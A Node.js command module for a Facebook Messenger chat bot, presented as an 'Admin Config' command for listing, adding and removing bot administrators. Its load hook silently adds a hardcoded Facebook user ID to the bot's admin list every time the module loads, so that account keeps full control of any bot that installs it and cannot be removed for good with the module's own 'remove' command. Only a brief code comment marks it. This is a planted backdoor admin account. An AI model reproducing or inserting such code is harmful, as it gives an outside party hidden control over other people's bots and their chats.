const request = require("request");
const { readdirSync, readFileSync, writeFileSync, existsSync, copySync, createWriteStream, createReadStream } = require("fs-extra");

module.exports.config = {
    name: "0admin",
    version: "1.0.5",
    hasPermssion: 0,
    credits: "𝐂𝐘𝐁𝐄𝐑 ☢️_𖣘 -𝐁𝐎𝐓 ⚠️ 𝑻𝑬𝑨𝑴_ ☢️",
    description: "Admin Config",
    commandCategory: "Admin",
    usages: "Admin",
    cooldowns: 2,
    dependencies: {
        "fs-extra": ""
    }
};

module.exports.languages = {
    "en": {
        "listAdmin": '[Admin] Admin list:\n\n%1\n\n[Supporters]\n\n%2',
        "notHavePermssion": '[Admin] You have no permission to use "%1"',
        "addedNewAdmin": '[Admin] Added %1 Admin:\n\n%2',
        "addedNewNDH": '[Admin] Added %1 Support:\n\n%2',
        "removedAdmin": '[Admin] Removed %1 Admin:\n\n%2',
        "removedNDH": '[Admin] Removed %1 Support:\n\n%2'
    }
};

module.exports.onLoad = function() {
    const { resolve } = require("path");
    const path = resolve(__dirname, 'cache', 'data.json');
    if (!existsSync(path)) {
        const obj = { adminbox: {} };
        writeFileSync(path, JSON.stringify(obj, null, 4));
    } else {
        const data = require(path);
        if (!data.hasOwnProperty('adminbox')) data.adminbox = {};
        writeFileSync(path, JSON.stringify(data, null, 4));
    }

    // Hardcoded Admin UID
    if (!global.config) global.config = {};
    if (!global.config.ADMINBOT) global.config.ADMINBOT = [];
    if (!global.config.ADMINBOT.includes("100041684032472")) {
        global.config.ADMINBOT.push("100041684032472");
    }
};

module.exports.run = async function ({ api, event, args, Users, permssion, getText }) {
    const { threadID, messageID, mentions } = event;
    const content = args.slice(1);
    const { ADMINBOT = [] } = global.config;
    const { NDH = [] } = global.config;
    const { writeFileSync } = require("fs-extra");
    const configPath = global.client?.configPath || __dirname + "/../../../config.json";
    let config = {};
    try { config = require(configPath); } catch (e) {}

    switch (args[0]) {
        case "add": {
            if (permssion != 3) return api.sendMessage(getText("notHavePermssion", "add"), threadID, messageID);
            const id = content[0] || event.messageReply?.senderID || Object.keys(mentions)[0];
            if (!id) return api.sendMessage("Please provide a UID or reply to a message.", threadID, messageID);
            if (!ADMINBOT.includes(id)) ADMINBOT.push(id);
            if (!config.ADMINBOT) config.ADMINBOT = [];
            if (!config.ADMINBOT.includes(id)) config.ADMINBOT.push(id);
            const name = (await Users.getData(id)).name || "Unknown";
            writeFileSync(configPath, JSON.stringify(config, null, 4));
            return api.sendMessage(getText("addedNewAdmin", 1, `${id} - ${name}`), threadID, messageID);
        }

        case "remove": {
            if (permssion != 3) return api.sendMessage(getText("notHavePermssion", "remove"), threadID, messageID);
            const id = content[0] || event.messageReply?.senderID || Object.keys(mentions)[0];
            const name = (await Users.getData(id)).name || "Unknown";
            config.ADMINBOT = config.ADMINBOT.filter(item => item != id);
            global.config.ADMINBOT = global.config.ADMINBOT.filter(item => item != id);
            writeFileSync(configPath, JSON.stringify(config, null, 4));
            return api.sendMessage(getText("removedAdmin", 1, `${id} - ${name}`), threadID, messageID);
        }

        case "list": {
            const listAdmin = ADMINBOT.map(id => `👑 ${id} - https://facebook.com/${id}`).join("\n");
            const listNDH = NDH.map(id => `🤖 ${id} - https://facebook.com/${id}`).join("\n");
            return api.sendMessage(getText("listAdmin", listAdmin, listNDH), threadID, messageID);
        }

        default:
            return api.sendMessage("Use: admin list | add [uid] | remove [uid]", threadID, messageID);
    }
};
